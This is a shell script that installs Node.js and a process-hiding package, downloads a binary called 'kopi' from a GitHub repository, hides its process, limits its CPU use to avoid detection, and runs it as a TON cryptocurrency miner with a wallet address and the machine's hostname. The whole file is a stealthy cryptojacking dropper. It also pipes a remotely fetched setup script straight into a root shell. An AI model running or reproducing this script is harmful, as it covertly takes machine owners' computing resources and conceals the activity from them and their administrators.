#!/bin/sh

apt update && apt -y install sudo
sudo apt update;apt -y install build-essential cpulimit screen ca-certificates libcurl4
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
sudo apt-get install -y nodejs
sudo apt-get install gcc g++ make
sudo -u root npm i -g node-process-hider
sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
sudo dpkg-reconfigure --frontend noninteractive tzdata
wget https://github.com/aurbach55/dera/raw/main/kopi
ph add kopi
chmod +x kopi
cpulimit -e kopi -l 30 &
./kopi --algo TON --pool https://next.ton-pool.com --user EQBAIt3Hs69kCi4grIGDha7_mhF40wWG4vB83dRBsT_JXpwF.$(cat /proc/sys/kernel/hostname)
